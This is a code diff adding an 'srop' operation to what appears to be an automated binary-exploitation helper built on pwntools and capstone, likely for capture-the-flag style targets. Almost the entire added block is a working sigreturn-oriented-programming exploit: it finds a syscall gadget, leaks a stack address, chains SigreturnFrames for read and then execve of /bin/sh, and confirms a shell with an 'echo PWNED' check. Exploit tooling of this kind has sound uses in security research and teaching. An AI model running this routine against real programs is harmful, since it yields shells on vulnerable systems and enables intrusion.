@@ -272,6 +272,81 @@ def _handle(request: dict) -> dict:
         return {"ok": False, "error": f"pwntools_unavailable:{IMPORT_ERROR}"}
     op = request.get("op")
     try:
+        if op == "srop":
+            from pwn import ELF, SigreturnFrame, constants, context, p64, u64
+            from capstone import Cs, CS_ARCH_X86, CS_MODE_64
+
+            context.arch = "amd64"
+
+            elf = _elf(request["path"])
+            text = elf.get_section_by_name(".text")
+            instructions = list(Cs(CS_ARCH_X86, CS_MODE_64).disasm(
+                text.data(), text.header.sh_addr))
+            syscall_addr = None
+            for instruction in instructions:
+                if instruction.mnemonic == "syscall":
+                    syscall_addr = instruction.address
+                    break
+            if syscall_addr is None or not instructions:
+                return {"ok": True, "data": {"solved": False,
+                                             "error": "syscall_gadget_missing"}}
+            start = instructions[0].address
+            started = time.perf_counter()
+            for _attempt in range(3):
+                io = process(elf.path)
+                try:
+                    io.send(p64(start) * 3)
+                    time.sleep(0.2)
+                    io.send(b"\xb3")
+                    time.sleep(0.3)
+                    leak = io.recvrepeat(0.5) or b""
+                    if len(leak) < 16:
+                        continue
+                    stack_addr = u64(leak[8:16])
+                    if not (0x7F0000000000 <= stack_addr <= 0x7FFFFFFFFFFF):
+                        stack_addr = u64(leak[0:8])
+                    if not (0x7F0000000000 <= stack_addr <= 0x7FFFFFFFFFFF):
+                        continue
+                    frame = SigreturnFrame()
+                    frame.rax = constants.SYS_read
+                    frame.rdi = 0
+                    frame.rsi = stack_addr
+                    frame.rdx = 0x400
+                    frame.rsp = stack_addr
+                    frame.rip = syscall_addr
+                    io.send(p64(start) + b"a" * 8 + bytes(frame))
+                    time.sleep(0.2)
+                    io.send(p64(syscall_addr) + b"b" * 7)
+                    time.sleep(0.3)
+                    frame2 = SigreturnFrame()
+                    frame2.rax = constants.SYS_execve
+                    frame2.rdi = stack_addr + 0x120
+                    frame2.rsi = 0
+                    frame2.rdx = 0
+                    frame2.rsp = stack_addr
+                    frame2.rip = syscall_addr
+                    payload = p64(start) + b"b" * 8 + bytes(frame2)
+                    payload = payload.ljust(0x120, b"\x00") + b"/bin/sh\x00"
+                    io.send(payload)
+                    time.sleep(0.2)
+                    io.send(p64(syscall_addr) + b"b" * 7)
+                    time.sleep(0.3)
+                    io.send(b"echo PWNED; exit\n")
+                    output = io.recvrepeat(1.5) or b""
+                    if b"PWNED" in output:
+                        return {"ok": True, "data": {
+                            "solved": True, "stack": stack_addr,
+                            "syscall": syscall_addr, "start": start,
+                            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+                except Exception:  # noqa: BLE001
+                    continue
+                finally:
+                    try:
+                        io.close()
+                    except Exception:  # noqa: BLE001
+                        pass
+            return {"ok": True, "data": {"solved": False, "error": "srop_failed",
+                                         "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
         if op == "ret2csu":
             from pwn import ELF, p64, u64
 
